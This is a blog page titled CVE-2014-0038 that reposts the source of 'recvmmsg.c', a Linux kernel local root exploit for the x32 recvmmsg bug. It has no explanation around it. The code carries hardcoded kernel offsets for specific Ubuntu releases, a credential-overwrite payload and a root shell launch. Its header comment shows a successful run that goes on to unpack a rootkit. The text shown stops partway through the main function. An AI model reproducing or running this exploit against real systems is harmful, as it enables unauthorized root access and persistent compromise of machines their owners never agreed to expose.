

<!DOCTYPE html>
<html lang="en">
    <head>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta http-equiv="content-type" content="text/html; charset=utf-8">

      <!-- Enable responsiveness on mobile devices-->
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

      <title>@xjump</title>

      
        <link rel="alternate" type="application/rss+xml" title="RSS" href="https:&#x2F;&#x2F;xjump.me&#x2F;rss.xml">
      

      
          <script src="/slideout/1.0.1/slideout.min.js"></script>
          
          <link rel="stylesheet" href="/katex/0.10.1/katex.min.css">

          <script defer src="/katex/0.10.1/katex.min.js" ></script>
          <script defer src="/katex/0.10.1/contrib/mathtex-script-type.min.js" ></script>
              
          <script defer src="/katex/0.10.1/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
              
          
      

      
          <link rel="stylesheet" href="https:&#x2F;&#x2F;xjump.me&#x2F;site.css">
          
          <link rel="stylesheet" href="/katex/0.10.1/katex.min.css"  >
          
      

      
      
    </head>

    <body>
        <div class="container">

            <div id="mobile-navbar" class="mobile-navbar">
              <div class="mobile-header-logo">
                <a href="/" class="logo">@xjump</a>
              </div>
              <div class="mobile-navbar-icon icon-out">
                <span></span>
                <span></span>
                <span></span>
              </div>
            </div>

            <nav id="mobile-menu" class="mobile-menu slideout-menu slideout-menu-left">
              <ul class="mobile-menu-list">
                
                    <li class="mobile-menu-item">
                        <a href="https://xjump.me">
                            Home
                        </a>
                    </li>
                
                    <li class="mobile-menu-item">
                        <a href="https://xjump.me&#x2F;categories">
                            Categories
                        </a>
                    </li>
                
                    <li class="mobile-menu-item">
                        <a href="https://xjump.me&#x2F;tags&#x2F;all">
                            Archive
                        </a>
                    </li>
                
                    <li class="mobile-menu-item">
                        <a href="https://xjump.me&#x2F;rss.xml">
                            RSS
                        </a>
                    </li>
                
                    <li class="mobile-menu-item">
                        <a href="https://xjump.me&#x2F;about">
                            About
                        </a>
                    </li>
                
              </ul>
            </nav>

            <header id="header">
                <div class="logo"><a href="https:&#x2F;&#x2F;xjump.me">@xjump</a></div>
                <nav class="menu">
                    <ul>
                        
                            <li>
                                <a href="https://xjump.me">
                                    Home
                                </a>
                            </li>
                        
                            <li>
                                <a href="https://xjump.me&#x2F;categories">
                                    Categories
                                </a>
                            </li>
                        
                            <li>
                                <a href="https://xjump.me&#x2F;tags&#x2F;all">
                                    Archive
                                </a>
                            </li>
                        
                            <li>
                                <a href="https://xjump.me&#x2F;rss.xml">
                                    RSS
                                </a>
                            </li>
                        
                            <li>
                                <a href="https://xjump.me&#x2F;about">
                                    About
                                </a>
                            </li>
                        
                    </ul>
                </nav>
            </header>

            <main>
                <div class="content" id="mobile-panel">
                    



<article class="post">
    
    <header class="post__header">
        <h1 class="post__title">
            <a href="https:&#x2F;&#x2F;xjump.me&#x2F;cve-2014-0038&#x2F;">CVE-2014-0038</a>
        </h1>
        <div class="post__meta">
            <span class="post__time">2014-06-30</span>
            
        </div>
    </header>

    <div class="post-content">
      <pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* </span><span style="color:#65737e;">
</span><span style="color:#65737e;">*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*</span><span style="color:#65737e;">
</span><span style="color:#65737e;">recvmmsg.c - linux 3.4+ local root (CONFIG_X86_X32=y)</span><span style="color:#65737e;">
</span><span style="color:#65737e;">CVE-2014-0038 / x32 ABI with recvmmsg</span><span style="color:#65737e;">
</span><span style="color:#65737e;">by rebel @ irc.smashthestack.org</span><span style="color:#65737e;">
</span><span style="color:#65737e;">-----------------------------------</span><span style="color:#65737e;">
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">takes about 13 minutes to run because timeout-&gt;tv_sec is decremented</span><span style="color:#65737e;">
</span><span style="color:#65737e;">once per second and 0xff*3 is 765.</span><span style="color:#65737e;">
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">some things you could do while waiting:</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* watch http://www.youtube.com/watch?v=OPyZGCKu2wg 3 times</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* read https://wiki.ubuntu.com/Security/Features and smirk a few times</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* brew some coffee</span><span style="color:#65737e;">
</span><span style="color:#65737e;">* stare at the countdown giggly with anticipation</span><span style="color:#65737e;">
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">could probably whack the high bits of some pointer with nanoseconds,</span><span style="color:#65737e;">
</span><span style="color:#65737e;">but that would require a bunch of nulls before the pointer and then</span><span style="color:#65737e;">
</span><span style="color:#65737e;">reading an oops from dmesg which isn&amp;#39;t that elegant.</span><span style="color:#65737e;">
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">&amp;net_sysctl_root.permissions is nice because it has 16 trailing nullbytes</span><span style="color:#65737e;">
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">hardcoded offsets because I only saw this on ubuntu &amp; kallsyms is protected</span><span style="color:#65737e;">
</span><span style="color:#65737e;">anyway..</span><span style="color:#65737e;">
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">same principle will work on 32bit but I didn&amp;#39;t really find any major</span><span style="color:#65737e;">
</span><span style="color:#65737e;">distros shipping with CONFIG_X86_X32=y</span><span style="color:#65737e;">
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">user@ubuntu:~$ uname -a</span><span style="color:#65737e;">
</span><span style="color:#65737e;">Linux ubuntu 3.11.0-15-generic #23-Ubuntu SMP Mon Dec 9 18:17:04 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux</span><span style="color:#65737e;">
</span><span style="color:#65737e;">user@ubuntu:~$ gcc recvmmsg.c -o recvmmsg</span><span style="color:#65737e;">
</span><span style="color:#65737e;">user@ubuntu:~$ ./recvmmsg</span><span style="color:#65737e;">
</span><span style="color:#65737e;">byte 3 / 3.. ~0 secs left. </span><span style="color:#65737e;">
</span><span style="color:#65737e;">w00p w00p!</span><span style="color:#65737e;">
</span><span style="color:#65737e;"># id</span><span style="color:#65737e;">
</span><span style="color:#65737e;">uid=0(root) gid=0(root) groups=0(root)</span><span style="color:#65737e;">
</span><span style="color:#65737e;"># sh phalanx-2.6b-x86_64.sh</span><span style="color:#65737e;">
</span><span style="color:#65737e;">unpacking..</span><span style="color:#65737e;">
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">:)=</span><span style="color:#65737e;">
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">greets to my homeboys kaliman, beist, capsl &amp; all of #social</span><span style="color:#65737e;">
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">Sat Feb 1 22:15:19 CET 2014</span><span style="color:#65737e;">
</span><span style="color:#65737e;">% rebel %</span><span style="color:#65737e;">
</span><span style="color:#65737e;">*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*</span><span style="color:#65737e;">
</span><span style="color:#65737e;">*/</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">_GNU_SOURCE</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">netinet/ip.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/socket.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/syscall.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/mman.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/types.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/stat.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/utsname.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">__X32_SYSCALL_BIT </span><span style="color:#d08770;">0x40000000</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#undef</span><span style="color:#c0c5ce;"> __NR_recvmmsg</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">__NR_recvmmsg (__X32_SYSCALL_BIT + </span><span style="color:#d08770;">537</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">VLEN </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">BUFSIZE </span><span style="color:#d08770;">200</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> port;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">offset {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*kernel_version;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> dest; </span><span style="color:#65737e;">// net_sysctl_root + 96</span><span style="color:#65737e;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> original_value; </span><span style="color:#65737e;">// net_ctl_permissions</span><span style="color:#65737e;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> prepare_kernel_cred;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> commit_creds;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">};</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> offset offsets[] = {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">{&quot;</span><span style="color:#a3be8c;">3.11.0-15-generic</span><span style="color:#c0c5ce;">&quot;,</span><span style="color:#d08770;">0xffffffff81cdf400</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">96</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xffffffff816d4ff0</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xffffffff8108afb0</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xffffffff8108ace0</span><span style="color:#c0c5ce;">}, </span><span style="color:#65737e;">// Ubuntu 13.10</span><span style="color:#65737e;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">{&quot;</span><span style="color:#a3be8c;">3.11.0-12-generic</span><span style="color:#c0c5ce;">&quot;,</span><span style="color:#d08770;">0xffffffff81cdf3a0</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xffffffff816d32a0</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xffffffff8108b010</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xffffffff8108ad40</span><span style="color:#c0c5ce;">}, </span><span style="color:#65737e;">// Ubuntu 13.10</span><span style="color:#65737e;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">{&quot;</span><span style="color:#a3be8c;">3.8.0-19-generic</span><span style="color:#c0c5ce;">&quot;,</span><span style="color:#d08770;">0xffffffff81cc7940</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xffffffff816a7f40</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xffffffff810847c0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xffffffff81084500</span><span style="color:#c0c5ce;">}, </span><span style="color:#65737e;">// Ubuntu 13.04</span><span style="color:#65737e;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">{</span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">};</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">udp</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">b</span><span style="color:#c0c5ce;">) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> sockfd;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> sockaddr_in servaddr,cliaddr;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> s = </span><span style="color:#d08770;">0xff</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">fork</span><span style="color:#c0c5ce;">() == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">while</span><span style="color:#c0c5ce;">(s &gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">fprintf</span><span style="color:#c0c5ce;">(stderr,&quot;</span><span style="color:#96b5b4;">\r</span><span style="color:#a3be8c;">byte </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;"> / 3.. ~</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;"> secs left </span><span style="color:#96b5b4;">\b\b\b\b</span><span style="color:#c0c5ce;">&quot;,b+</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">0xff </span><span style="color:#c0c5ce;">- b*</span><span style="color:#d08770;">0xff </span><span style="color:#c0c5ce;">- (</span><span style="color:#d08770;">0xff</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">-s));</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">sleep</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#c0c5ce;">s--;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">fprintf</span><span style="color:#c0c5ce;">(stderr,&quot;</span><span style="color:#a3be8c;">.</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">sockfd = </span><span style="color:#bf616a;">socket</span><span style="color:#c0c5ce;">(AF_INET,SOCK_DGRAM,</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">bzero</span><span style="color:#c0c5ce;">(&amp;servaddr,sizeof(servaddr));</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">servaddr.</span><span style="color:#bf616a;">sin_family </span><span style="color:#c0c5ce;">= AF_INET;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">servaddr.</span><span style="color:#bf616a;">sin_addr</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">s_addr</span><span style="color:#c0c5ce;">=</span><span style="color:#bf616a;">htonl</span><span style="color:#c0c5ce;">(INADDR_LOOPBACK);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">servaddr.</span><span style="color:#bf616a;">sin_port</span><span style="color:#c0c5ce;">=</span><span style="color:#bf616a;">htons</span><span style="color:#c0c5ce;">(port);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">sendto</span><span style="color:#c0c5ce;">(sockfd,&quot;</span><span style="color:#a3be8c;">1</span><span style="color:#c0c5ce;">&quot;,</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> sockaddr *)&amp;servaddr,sizeof(servaddr));</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">trigger</span><span style="color:#c0c5ce;">() {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/proc/sys/net/core/somaxconn</span><span style="color:#c0c5ce;">&quot;,O_RDONLY);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">getuid</span><span style="color:#c0c5ce;">() != </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">fprintf</span><span style="color:#c0c5ce;">(stderr,&quot;</span><span style="color:#a3be8c;">not root, ya blew it!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">fprintf</span><span style="color:#c0c5ce;">(stderr,&quot;</span><span style="color:#a3be8c;">w00p w00p!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/bin/sh -i</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">typedef int __attribute__</span><span style="color:#c0c5ce;">((regparm(</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">))) (* _commit_creds)(</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> cred);</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">typedef unsigned long __attribute__</span><span style="color:#c0c5ce;">((regparm(</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">))) (* _prepare_kernel_cred)(</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> cred);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">_commit_creds commit_creds;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">_prepare_kernel_cred prepare_kernel_cred;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">// thx bliss</span><span style="color:#65737e;">
</span><span style="color:#b48ead;">static int __attribute__</span><span style="color:#c0c5ce;">((regparm(</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">)))</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">getroot</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">head</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">* </span><span style="color:#bf616a;">table</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">{</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">commit_creds</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">prepare_kernel_cred</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">));</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void __attribute__</span><span style="color:#c0c5ce;">((regparm(</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">)))</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">trampoline</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">{</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">asm</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">mov $getroot, %rax; call *%rax;</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">{</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> sockfd, retval, i;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> sockaddr_in sa;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> mmsghdr msgs[VLEN];</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> iovec iovecs[VLEN];</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> buf[BUFSIZE];</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">long</span><span style="color:#c0c5ce;"> mmapped;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> utsname u;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> offset *off = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">uname</span><span style="color:#c0c5ce;">(&amp;u);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(i=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;offsets[i].</span><span style="color:#bf616a;">kernel_version </span><span style="color:#c0c5ce;">!= </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;i++) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(!</span><span style="color:#96b5b4;">strcmp</span><span style="color:#c0c5ce;">(offsets[i].</span><span style="color:#bf616a;">kernel_version</span><span style="color:#c0c5ce;">,u.</span><span style="color:#bf616a;">release</span><span style="color:#c0c5ce;">)) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#c0c5ce;">off = &amp;offsets[i];</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(!off) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">fprintf</span><span style="color:#c0c5ce;">(stderr,&quot;</span><span style="color:#a3be8c;">no offsets for this kernel version..</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">mmapped = (off-&gt;</span><span style="color:#bf616a;">original_value </span><span style="color:#c0c5ce;">&amp; ~(</span><span style="color:#bf616a;">sysconf</span><span style="color:#c0c5ce;">(_SC_PAGE_SIZE) - </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">));</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">mmapped &amp;= </span><span style="color:#d08770;">0x000000ffffffffff</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">srand</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">time</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">));</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">port = (</span><span style="color:#96b5b4;">rand</span><span style="color:#c0c5ce;">() % </span><span style="color:#d08770;">30000</span><span style="color:#c0c5ce;">)+</span><span style="color:#d08770;">1500</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">commit_creds = (_commit_creds)off-&gt;</span><span style="color:#bf616a;">commit_creds</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
